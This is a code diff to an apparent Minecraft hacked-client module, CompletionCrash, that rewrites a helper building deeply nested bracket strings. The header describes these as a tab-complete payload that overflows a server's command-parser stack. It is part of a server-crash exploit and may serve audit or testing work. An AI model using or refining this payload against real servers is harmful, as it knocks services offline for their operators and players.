@@ -9,8 +9,6 @@ import meteordevelopment.meteorclient.systems.modules.Module;
 import meteordevelopment.orbit.EventHandler;
 import net.minecraft.network.packet.c2s.play.RequestCommandCompletionsC2SPacket;
 
-import java.util.stream.Collectors;
-import java.util.stream.IntStream;
 
 /**
  * AUDIT: Completion Crash (command-parser stack overflow via tab-complete)
@@ -55,7 +53,10 @@ public class CompletionCrash extends Module {
     }
 
     private static String generateNestedJson(int levels) {
-        String open = IntStream.range(0, levels).mapToObj(i -> "[").collect(Collectors.joining());
-        return "{a:" + open + "}";
+        StringBuilder sb = new StringBuilder("{a:");
+        for (int i = 0; i < levels; i++) sb.append('[');
+        for (int i = 0; i < levels; i++) sb.append(']');
+        sb.append('}');
+        return sb.toString();
     }
 }
